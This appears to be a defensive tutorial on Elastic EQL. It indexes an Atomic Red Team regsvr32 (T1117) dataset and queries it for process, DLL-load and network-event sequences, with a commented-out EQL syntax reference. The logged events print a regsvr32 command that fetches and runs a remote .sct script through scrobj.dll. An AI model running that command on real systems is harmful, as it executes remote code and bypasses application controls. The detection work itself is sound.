### Example: Detect threats with EQL

See [Example: Detect threats with EQL](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/eql-ex-threat-detection.html)
See [EQL syntax reference](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/eql-syntax.html)

#### Setup

To get started:

1. Create an [index template](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/index-templates.html) with [data stream enabled](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/set-up-a-data-stream.html#create-index-template)

```json

PUT /_index_template/my-data-stream-template
{
  "index_patterns": [ "my-data-stream*" ],
  "data_stream": { },
  "priority": 500
}

```

2. Use the [bulk API](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/docs-bulk.html) to index the data to a matching stream:

```json

curl -XPOST "localhost:9200/my-data-stream/_bulk?pretty&refresh" -s -u elastic:changeme -H 'Content-Type: application/x-ndjson' --data-binary "@dataset/normalized-T1117-AtomicRed-regsvr32.json"

```

3. Use the [cat indices API](https://www.elastic.co/guide/en/elasticsearch/reference/7.17/cat-indices.html) to verify the data was indexed:

```json

GET /_cat/indices/my-data-stream?v=true&h=health,status,index,docs.count

```

#### Get a count of regsvr32 events

```json

GET /my-data-stream/_eql/search?filter_path=-hits.events    
{
  "query": """
    any where process.name == "regsvr32.exe"                
  """,
  "size": 200                                               
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 1,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 143,
      "relation" : "eq"
    }
  }
}

```

</details>


#### Check for command line artifacts

```json

GET my-data-stream/_eql/search?filter_path=hits.events
{
  "query": """
    any where process.name == "regsvr32.exe" and  process.command_line.keyword !=null
  """,
  "size": 200
}

```

<details>
  <summary>Response:</summary>

```json

{
  "hits" : {
    "events" : [
      {
        "_index" : ".ds-my-data-stream-2023.04.28-000001",
        "_id" : "9v9YxocBJz9yVPk--OPB",
        "_source" : {
          "process" : {
            "parent" : {
              "name" : "cmd.exe",
              "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
              "executable" : """C:\Windows\System32\cmd.exe"""
            },
            "name" : "regsvr32.exe",
            "pid" : 2012,
            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
            "executable" : """C:\Windows\System32\regsvr32.exe""",
            "ppid" : 2652
          },
          "logon_id" : 217055,
          "@timestamp" : 131883573237130000,
          "event" : {
            "category" : "process",
            "type" : "creation"
          },
          "user" : {
            "full_name" : "bob",
            "domain" : "ART-DESKTOP",
            "id" : """ART-DESKTOP\bob"""
          }
        }
      }
    ]
  }
}

```

</details>

#### Check for malicious script loads

Check if regsvr32.exe later loads the scrobj.dll library:

```json

GET /my-data-stream/_eql/search
{
  "query": """
    any where process.name == "regsvr32.exe"  and dll.name == "scrobj.dll"              
  """
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 1,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 1,
      "relation" : "eq"
    },
    "events" : [
      {
        "_index" : ".ds-my-data-stream-2023.04.28-000001",
        "_id" : "Fv9YxocBJz9yVPk--OTC",
        "_source" : {
          "process" : {
            "name" : "regsvr32.exe",
            "pid" : 2012,
            "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
            "executable" : """C:\Windows\System32\regsvr32.exe"""
          },
          "dll" : {
            "path" : """C:\Windows\System32\scrobj.dll""",
            "name" : "scrobj.dll"
          },
          "@timestamp" : 131883573237450016,
          "event" : {
            "category" : "library"
          }
        }
      }
    ]
  }
}

```

</details>

#### Determine the likelihood of success

heck for the following series of events:

1. A regsvr32.exe process
2. A load of the scrobj.dll library by the same process
3. Any network event by the same process

```json

GET /my-data-stream/_eql/search
{
  "query": """
    sequence by process.pid
      [process where process.name == "regsvr32.exe" ]
      [library where dll.name == "scrobj.dll"]
      [network where true]
  """
}

```

<details>
  <summary>Response:</summary>

```json

{
  "is_partial" : false,
  "is_running" : false,
  "took" : 34,
  "timed_out" : false,
  "hits" : {
    "total" : {
      "value" : 1,
      "relation" : "eq"
    },
    "sequences" : [
      {
        "join_keys" : [
          2012
        ],
        "events" : [
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "9v9YxocBJz9yVPk--OPB",
            "_source" : {
              "process" : {
                "parent" : {
                  "name" : "cmd.exe",
                  "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
                  "executable" : """C:\Windows\System32\cmd.exe"""
                },
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "command_line" : "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
                "executable" : """C:\Windows\System32\regsvr32.exe""",
                "ppid" : 2652
              },
              "logon_id" : 217055,
              "@timestamp" : 131883573237130000,
              "event" : {
                "category" : "process",
                "type" : "creation"
              },
              "user" : {
                "full_name" : "bob",
                "domain" : "ART-DESKTOP",
                "id" : """ART-DESKTOP\bob"""
              }
            }
          },
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "Fv9YxocBJz9yVPk--OTC",
            "_source" : {
              "process" : {
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable" : """C:\Windows\System32\regsvr32.exe"""
              },
              "dll" : {
                "path" : """C:\Windows\System32\scrobj.dll""",
                "name" : "scrobj.dll"
              },
              "@timestamp" : 131883573237450016,
              "event" : {
                "category" : "library"
              }
            }
          },
          {
            "_index" : ".ds-my-data-stream-2023.04.28-000001",
            "_id" : "hP9YxocBJz9yVPk--OTC",
            "_source" : {
              "process" : {
                "name" : "regsvr32.exe",
                "pid" : 2012,
                "entity_id" : "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable" : """C:\Windows\System32\regsvr32.exe"""
              },
              "destination" : {
                "address" : "151.101.48.133",
                "port" : "443"
              },
              "source" : {
                "address" : "192.168.162.134",
                "port" : "50505"
              },
              "network" : {
                "direction" : "outbound",
                "protocol" : "tcp"
              },
              "@timestamp" : 131883573238680000,
              "event" : {
                "category" : "network"
              },
              "user" : {
                "full_name" : "bob",
                "domain" : "ART-DESKTOP",
                "id" : """ART-DESKTOP\bob"""
              }
            }
          }
        ]
      }
    ]
  }
}

```

</details>

<!--

##### Basic syntax

EQL queries require an event category and a matching condition. The where keyword connects them.

```
event_category where condition

```

An event category is an indexed value of the event category field. By default, the EQL search API uses the event.category field from the Elastic Common Schema (ECS). You can specify another event category field using the API’s event_category_field parameter.

For example, the following EQL query matches events with an event category of process and a process.name of svchost.exe:

```
process where process.name == "svchost.exe"

```

##### Match any event category

For example, the following EQL query matches any documents with a network.protocol field value of http:

```
any where network.protocol == "http"
```

##### Escape an event category

Use enclosing double quotes (") or three enclosing double quotes (""") to escape event categories that:

- Contain a special character, such as a hyphen (-) or dot (.)
- Contain a space
- Start with a numeral

```

".my.event.category"
"my-event-category"
"my event category"
"6eventcategory"

""".my.event.category"""
"""my-event-category"""
"""my event category"""
"""6eventcategory"""

```

##### Escape a field name

Use enclosing backticks (`) to escape field names that:

- Contain a hyphen (-)
- Contain a space
- Start with a numeral

```

`my-field`
`my field`
`6myfield`

```

Use double backticks (``) to escape any backticks (`) in the field name.

```

my`field -> `my``field`

```

##### Conditions

A condition consists of one or more criteria an event must match. You can specify and combine these criteria using the following operators. Most EQL operators are case-sensitive by default.

Comparison operators

```

<   <=   ==   :   !=   >=   >

```

```

< (less than)
<= (less than or equal)
== (equal, case-sensitive)
: (equal, case-insensitive)
!= (not equal, case-sensitive)
>= (greater than or equal)
> (greater than)

```

##### Pattern comparison keyword

```

my_field like  "VALUE*"         // case-sensitive wildcard matching
my_field like~ "value*"         // case-insensitive wildcard matching

my_field regex  "VALUE[^Z].?"   // case-sensitive regex matching
my_field regex~ "value[^z].?"   // case-insensitive regex matching

```

- like (case-sensitive)
Returns true if the string to the left of the keyword matches a wildcard pattern to the right. Supports list lookups. Can only be used to compare strings. For case-insensitive matching, use like~.

- regex (case-sensitive)
Returns true if the string to the left of the keyword matches a regular expression to the right. For supported regular expression syntax, see Regular expression syntax. Supports list lookups. Can only be used to compare strings. For case-insensitive matching, use regex~.


example:

The following EQL query compares the process.parent_name field value to a static value, foo. This comparison is supported.

However, the query also compares the process.parent.name field value to the process.name field. This comparison is not supported and will return an error for the entire query.

```
process where process.parent.name == "foo" and process.parent.name == process.name

```

Instead, you can rewrite the query to compare both the process.parent.name and process.name fields to static values.

```
process where process.parent.name == "foo" and process.name == "foo"

```

##### Logical operators

```

and  or  not

```

- and: Returns true only if the condition to the left and right both return true. Otherwise returns false.
- or:  Returns true if one of the conditions to the left or right true. Otherwise returns false.
- not: Returns true if the condition to the right is false.


##### Lookup operators

```

my_field in ("Value-1", "VALUE2", "VAL3")                 // case-sensitive
my_field in~ ("value-1", "value2", "val3")                // case-insensitive

my_field not in ("Value-1", "VALUE2", "VAL3")             // case-sensitive
my_field not in~ ("value-1", "value2", "val3")            // case-insensitive

my_field : ("value-1", "value2", "val3")                  // case-insensitive

my_field like  ("Value-*", "VALUE2", "VAL?")              // case-sensitive
my_field like~ ("value-*", "value2", "val?")              // case-insensitive

my_field regex  ("[vV]alue-[0-9]", "VALUE[^2].?", "VAL3") // case-sensitive
my_field regex~  ("value-[0-9]", "value[^2].?", "val3")   // case-sensitive

```

- in (case-sensitive)
Returns true if the value is contained in the provided list. For case-insensitive matching, use in~.
- not in (case-sensitive)
Returns true if the value is not contained in the provided list. For case-insensitive matching, use not in~.
- : (case-insensitive)
Returns true if the string is contained in the provided list. Can only be used to compare strings.
- like (case-sensitive)
Returns true if the string matches a wildcard pattern in the provided list. Can only be used to compare strings. For case-insensitive matching, use like~.
- regex (case-sensitive)
Returns true if the string matches a regular expression pattern in the provided list. For supported regular expression syntax, see Regular expression syntax. Can only be used to compare strings. For case-insensitive matching, use regex~.


##### Math operators

```
+  -  *  /  %

```

- + (add)
Adds the values to the left and right of the operator.
- - (subtract)
Subtracts the value to the right of the operator from the value to the left.
- * (multiply)
Multiplies the values to the left and right of the operator.
- / (divide)
Divides the value to the left of the operator by the value to the right.
- % (modulo)
Divides the value to the left of the operator by the value to the right. Returns only the remainder.

##### Match any condition

To match events solely on event category, use the where true condition.

For example, the following EQL query matches any file events:

```

file where true

```

To match any event, you can combine the any keyword with the where true condition:

```

any where true

```

##### Optional fields

By default, an EQL query can only contain fields that exist in the dataset you’re searching. A field exists in a dataset if it has an explicit, dynamic, or runtime mapping. If an EQL query contains a field that doesn’t exist, it returns an error.

If you aren’t sure if a field exists in a dataset, use the ? operator to mark the field as optional. If an optional field doesn’t exist, the query replaces it with null instead of returning an error.

Example

In the following query, the user.id field is optional.

```

network where ?user.id != null

```

If the user.id field exists in the dataset you’re searching, the query matches any network event that contains a user.id value. If the user.id field doesn’t exist in the dataset, EQL interprets the query as:

```

network where null != null

```

In this case, the query matches no events.

##### Check if a field exists

To match events containing any value for a field, compare the field to null using the != operator:

```

?my_field != null

```

To match events that do not contain a field value, compare the field to null using the == operator:

```

?my_field == null

```

##### Strings

Strings are enclosed in double quotes (").

```

"hello world"

```

Strings enclosed in single quotes (') are not supported.

##### Escape characters in a string

When used within a string, special characters, such as a carriage return or double quote ("), must be escaped with a preceding backslash (\).

```

"example \r of \" escaped \n characters"

```

##### Raw strings

Raw strings treat special characters, such as backslashes (\), as literal characters. Raw strings are enclosed in three double quotes (""").

```

"""Raw string with a literal double quote " and blackslash \ included"""

```

A raw string cannot contain three consecutive double quotes ("""). Instead, use a regular string with the \" escape sequence.

```

"String containing \"\"\" three double quotes"

```

##### Wildcards

For string comparisons using the : operator or like keyword, you can use the * and ? wildcards to match specific patterns. The * wildcard matches zero or more characters:

```

my_field : "doc*"     // Matches "doc", "docs", or "document" but not "DOS"
my_field : "*doc"     // Matches "adoc" or "asciidoc"
my_field : "d*c"      // Matches "doc" or "disc"

my_field like "DOC*"  // Matches "DOC", "DOCS", "DOCs", or "DOCUMENT" but not "DOS"
my_field like "D*C"   // Matches "DOC", "DISC", or "DisC"

```

The ? wildcard matches exactly one character:

```

my_field : "doc?"     // Matches "docs" but not "doc", "document", or "DOS"
my_field : "?doc"     // Matches "adoc" but not "asciidoc"
my_field : "d?c"      // Matches "doc" but not "disc"

my_field like "DOC?"  // Matches "DOCS" or "DOCs" but not "DOC", "DOCUMENT", or "DOS"
my_field like "D?c"   // Matches "DOC" but not "DISC"

```

The : operator and like keyword also support wildcards in list lookups:

```

my_field : ("doc*", "f*o", "ba?", "qux")
my_field like ("Doc*", "F*O", "BA?", "QUX")

```

##### Sequences

You can use EQL sequences to describe and match an ordered series of events. Each item in a sequence is an event category and event condition, surrounded by square brackets ([ ]). Events are listed in ascending chronological order, with the most recent event listed last.

```

sequence
  [ event_category_1 where condition_1 ]
  [ event_category_2 where condition_2 ]
  ...
  
```

The following EQL sequence query matches this series of ordered events:

1. Start with an event with:

  - An event category of file
  - A file.extension of exe

2. Followed by an event with an event category of process

```

sequence
  [ file where file.extension == "exe" ]
  [ process where true ]

```

**With maxspan statement**

You can use with maxspan to constrain a sequence to a specified timespan. All events in a matching sequence must occur within this duration, starting at the first event’s timestamp. maxspan accepts time value arguments.

```

sequence with maxspan=30s
  [ event_category_1 where condition_1 ] by field_baz
  [ event_category_2 where condition_2 ] by field_bar
  ...

```

The following sequence query uses a maxspan value of 15m (15 minutes). Events in a matching sequence must occur within 15 minutes of the first event’s timestamp.

```
sequence with maxspan=15m
  [ file where file.extension == "exe" ]
  [ process where true ]

```

**by keyword**

Use the by keyword in a sequence query to only match events that share the same values, even if those values are in different fields. These shared values are called join keys. If a join key should be in the same field across all events, use sequence by.

```
sequence by field_foo
  [ event_category_1 where condition_1 ] by field_baz
  [ event_category_2 where condition_2 ] by field_bar
  ...

```

The following sequence query uses the by keyword to constrain matching events to:

- Events with the same user.name value
- file events with a file.path value equal to the following process event’s process.executable value.

```

sequence
  [ file where file.extension == "exe" ] by user.name, file.path
  [ process where true ] by user.name, process.executable

```

Because the user.name field is shared across all events in the sequence, it can be included using sequence by. The following sequence is equivalent to the prior one.

```

sequence by user.name
  [ file where file.extension == "exe" ] by file.path
  [ process where true ] by process.executable

```

You can combine sequence by and with maxspan to constrain a sequence by both field values and a timespan.

```
sequence by field_foo with maxspan=30s
  [ event_category_1 where condition_1 ]
  [ event_category_2 where condition_2 ]
  ...

```

The following sequence query uses sequence by and with maxspan to only match a sequence of events that:

- Share the same user.name field values
- Occur within 15m (15 minutes) of the first matching event

```

sequence by user.name with maxspan=15m
  [ file where file.extension == "exe" ]
  [ process where true ]

```
##### Optional by fields

By default, a join key must be a non-null field value. To allow null join keys, use the ? operator to mark the by field as optional. This is also helpful if you aren’t sure the dataset you’re searching contains the by field.

Example

The following sequence query uses sequence by to constrain matching events to:

- Events with the same process.pid value, excluding null values. If the process.pid field doesn’t exist in the dataset you’re searching, the query returns an error.
- Events with the same process.entity_id value, including null values. If an event doesn’t contain the process.entity_id field, its process.entity_id value is considered null. This applies even if the process.pid field doesn’t exist in the dataset you’re searching.

```

sequence by process.pid, ?process.entity_id
  [process where process.name == "regsvr32.exe"]
  [network where true]

```

##### until keyword

You can use the until keyword to specify an expiration event for a sequence. If this expiration event occurs between matching events in a sequence, the sequence expires and is not considered a match. If the expiration event occurs after matching events in a sequence, the sequence is still considered a match. The expiration event is not included in the results.

```
sequence
  [ event_category_1 where condition_1 ]
  [ event_category_2 where condition_2 ]
  ...
until [ event_category_3 where condition_3 ]
```

Example

A dataset contains the following event sequences, grouped by shared IDs:

```
A, B
A, B, C
A, C, B
```

The following EQL query searches the dataset for sequences containing event A followed by event B. Event C is used as an expiration event.

```
sequence by ID
  A
  B
until C
```

The query matches sequences A, B and A, B, C but not A, C, B.

##### with runs statement

Use a with runs statement to run the same event criteria successively within a sequence query. For example:

```
sequence
  [ process where event.type == "creation" ]
  [ library where process.name == "regsvr32.exe" ] with runs=3
  [ registry where true ]
```

is equivalent to:

```
sequence
  [ process where event.type == "creation" ]
  [ library where process.name == "regsvr32.exe" ]
  [ library where process.name == "regsvr32.exe" ]
  [ library where process.name == "regsvr32.exe" ]
  [ registry where true ]
```

The runs value must be between 1 and 100 (inclusive).

You can use a with runs statement with the by keyword. For example:

```
sequence
  [ process where event.type == "creation" ] by process.executable
  [ library where process.name == "regsvr32.exe" ] by dll.path with runs=3
```

##### Functions

You can use EQL functions to convert data types, perform math, manipulate strings, and more. For a list of supported functions, see Function reference.

Case-insensitive functions

Most EQL functions are case-sensitive by default. To make a function case-insensitive, use the ~ operator after the function name:

```

stringContains(process.name,".exe")  // Matches ".exe" but not ".EXE" or ".Exe"
stringContains~(process.name,".exe") // Matches ".exe", ".EXE", or ".Exe"

```

How functions impact search performance

Using functions in EQL queries can result in slower search speeds. If you often use functions to transform indexed data, you can speed up search by making these changes during indexing instead. However, that often means slower index speeds.

Example

An index contains the file.path field. file.path contains the full path to a file, including the file extension.

When running EQL searches, users often use the endsWith function with the file.path field to match file extensions:

```

file where endsWith(file.path,".exe") or endsWith(file.path,".dll")

```

While this works, it can be repetitive to write and can slow search speeds. To speed up search, you can do the following instead:

1. Add a new field, file.extension, to the index. The file.extension field will contain only the file extension from the file.path field.

2. Use an ingest pipeline containing the grok processor or another preprocessor tool to extract the file extension from the file.path field before indexing.
Index the extracted file extension to the file.extension field.

3. These changes may slow indexing but allow for faster searches. Users can use the file.extension field instead of multiple endsWith function calls:

```

file where file.extension in ("exe", "dll")

```

We recommend testing and benchmarking any indexing changes before deploying them in production. See Tune for indexing speed and Tune for search speed.

##### Pipes

EQL pipes filter, aggregate, and post-process events returned by an EQL query. 

```
event_category where condition | pipe

authentication where agent.id == 4624
| tail 10

```
-->

